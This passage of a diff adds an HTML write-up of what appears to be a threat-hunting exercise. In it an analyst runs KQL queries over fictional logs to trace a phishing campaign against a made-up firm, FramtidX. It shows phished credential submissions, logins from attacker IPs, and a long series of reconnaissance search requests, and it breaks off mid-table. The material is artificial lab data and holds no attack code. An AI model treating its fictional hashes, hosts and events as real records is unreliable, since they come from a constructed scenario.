+                    <td>2024-06-26 16:13:22.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36</td>
+                    <td>https://greenprojectnews.net/modules/sign_in?username=jeowens&amp;password=**********</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>All of them did, unfortunately; all of them entered their credentials. Interestingly, there are no signs of Alex Johnson having ever clicked a link affiliated with Shadow Truth--perhaps he was targeted in a different manner. Before I investigate further, I first confirm what accounts were accessed by the threat actors using:</p>
+          <pre><kbd>let bad_ips =
+PassiveDns
+| where domain == "newdevelopmentupdates.org"
+| distinct ip; //2 ips
+AuthenticationEvents
+| where src_ip in (bad_ips)</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>hostname</th>
+                    <th>src_ip</th>
+                    <th>user_agent</th>
+                    <th>username</th>
+                    <th>result</th>
+                    <th>password_hash</th>
+                    <th>description</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-06-20 00:00:00.0000</td>
+                    <td>MAIL-SERVER01</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>aljohnson</td>
+                    <td>Successful Login</td>
+                    <td>1e7334cf5bd803e02b8bcf339c9d5315</td>
+                    <td>A user attempted to log in to their email</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-27 10:35:54.0000</td>
+                    <td>LRJP-DESKTOP</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>erbjorn</td>
+                    <td>Successful Login</td>
+                    <td>2379a957d6923e72a8de3c653682ba6f</td>
+                    <td>User successfully logged into their machine.</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-27 10:41:38.0000</td>
+                    <td>VJVS-MACHINE</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>solindgren</td>
+                    <td>Successful Login</td>
+                    <td>22886d6cb1aabf45dcd371ecaf943b5c</td>
+                    <td>User successfully logged into their machine.</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-27 11:02:51.0000</td>
+                    <td>DVD0-LAPTOP</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>jeowens</td>
+                    <td>Successful Login</td>
+                    <td>059b26bb7f11723c48b2cf3001605282</td>
+                    <td>User successfully logged into their machine.</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-27 11:06:48.0000</td>
+                    <td>MYZB-LAPTOP</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>anbath</td>
+                    <td>Successful Login</td>
+                    <td>07f869b0ffcc770fad7d8631c5924ff5</td>
+                    <td>User successfully logged into their machine.</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-27 12:09:51.0000</td>
+                    <td>DVD0-LAPTOP</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>jeowens</td>
+                    <td>Successful Login</td>
+                    <td>059b26bb7f11723c48b2cf3001605282</td>
+                    <td>User successfully logged into their machine.</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-27 12:12:29.0000</td>
+                    <td>APUV-LAPTOP</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>madoty</td>
+                    <td>Successful Login</td>
+                    <td>49592e924133f6acba5a864cb0b1db08</td>
+                    <td>User successfully logged into their machine.</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-27 12:40:59.0000</td>
+                    <td>BLVR-MACHINE</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>jokarlsson</td>
+                    <td>Successful Login</td>
+                    <td>750a910b14d63e3ee6a37c8f49b037a9</td>
+                    <td>User successfully logged into their machine.</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The threat actor successfully logged into all targeted user's accounts; 7 days before sending the phishing emails, they successfully logged into Alex Johnson's account.</p>
+        </section> <!--section 1-->
+        <section id="section2"><!--section 2-->
+          <h3>Section 2 - KQL 101 📚</h3>
+          <p>(This section was a simple refresher on KQL basics.)</p>
+        </section> <!--section 2-->
+        <section id="section3"><!--section 3-->
+          <h3>Section 3 - Alright it’s definitely an angry frog or two 🥵😨</h3>
+          <p>Erik Bjorn, the chief architect, informed me that the page to access internal plans was defaced and that he'll try to contact the other chief architect, Sofia Lindgren, who is currently on vacation--apparently, the architectural plans for FramtidX's latest project went missing. I must note that both Erik and Sofia had their accounts compromised by the threat actor (see <a href="">[X]</a> above). As I had previously uncovered (see <a href="">[X]</a>), the Chief Architects' received phishing emails informing of alleged "architecture plan changes". Much like Anita Bath's phishing email, the subject line was tailored to their particular role in the company (chief architects and web developer, respectively); clearly, they did their research before the attack. To search for any signs of recon on FramtidX's webpage, I use:</p>
+          <pre><kbd>let bad_ips =
+PassiveDns
+| where domain == "newdevelopmentupdates.org"
+| distinct ip; //2 ips
+InboundNetworkEvents
+| where src_ip in (bad_ips)</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>method</th>
+                    <th>src_ip</th>
+                    <th>user_agent</th>
+                    <th>url</th>
+                    <th>referrer</th>
+                    <th>status_code</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-06-20 00:00:00.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DFramtidX%2Bleadership%2Bteam</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:15:48.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DCurrent%2Bproject%2Bdetails</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:16:17.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DArchitectural%2Bplans%2Bfor%2Bthe%2Bnew%2Bmall</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:17:06.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DInternal%2Bdocuments%2Brepository</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:17:42.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DCompany%2Bemail%2Bdirectory</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:17:50.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DDeveloper%2Bcontact%2Blist</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:18:18.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DIT%2Binfrastructure%2Boverview</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:18:54.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DCurrent%2Band%2Bupcoming%2Bprojects</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:19:38.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DSecret%2Bprojects%2Band%2Binitiatives</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:19:57.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DShady%2Bdeals%2Band%2Bagreements</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:20:15.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DEnvironmental%2Bimpact%2Breports</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:20:52.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DRecent%2Bcompany%2Bscandals</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:21:18.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DInsider%2Btrading%2Bactivities</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:22:00.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DUnethical%2Bpractices%2Bwithin%2Bthe%2Bcompany</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:22:46.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DCEO%2527s%2Bdark%2Bsecrets</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:23:26.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DWhy%2Bis%2Bthis%2Bcompany%2Bso%2Bevil%253F</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:24:25.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DEvil%2Bplans%2Band%2Bschemes</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:25:09.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DHow%2Bto%2Bexpose%2Bcorporate%2Bcorruption</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:26:06.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DContact%2Binformation%2Bfor%2BIT%2Badmins</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:26:38.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DBackdoor%2Baccess%2Bpoints</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:26:55.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DBribery%2Bschemes%2Band%2Bpayouts</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:27:18.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DCompany%2Bcover-ups</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:28:15.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DMoney%2Blaundering%2Boperations</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:29:07.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DHidden%2Boffshore%2Baccounts</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:29:44.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DOffshore%2Binvestments</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:30:21.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DWhistleblower%2Breports</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:30:23.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DEmployee%2Bcomplaints%2Band%2Bgrievances</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:30:42.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DUnethical%2Bexperiments%2Bconducted</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:30:53.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DFrog%2Bmassacre%2Bcontroversy</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:31:21.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DCorruption%2Bwithin%2Bthe%2Bcompany</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:32:07.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DForbidden%2Bfiles%2Band%2Bdocuments</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:32:19.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DSecret%2Bvault%2Bcontents</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:33:13.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DCorporate%2Bconspiracy%2Btheories</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:33:47.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DVillainous%2Bplans%2Band%2Bplots</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:34:43.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DSecret%2Blaboratories</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:34:57.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DHidden%2Bcameras%2Bin%2Bthe%2Boffice</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:35:51.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DSurveillance%2Bfootage</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:36:31.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DClassified%2Binformation</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:37:03.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DDirty%2Blaundry%2Bof%2Bthe%2Bexecutives</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:37:16.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DEmployee%2Bblackmail%2Bincidents</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:37:44.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DRansom%2Bnotes%2Bfound</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:38:15.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DWho%2Bis%2Bthe%2Bevil%2Bmastermind%253F</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:38:57.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/search%3DCompany%2527s%2Bties%2Bto%2Bthe%2Bdark%2Bweb</td>
+                    <td>https:framtidxdevcorp.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:39:21.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/about-us</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:39:58.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/contact</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:40:16.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/leadership</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:40:51.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/leadership/johanna-karlsson</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:41:07.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/leadership/team</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:41:39.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/leadership/evil-masterminds</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:41:41.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
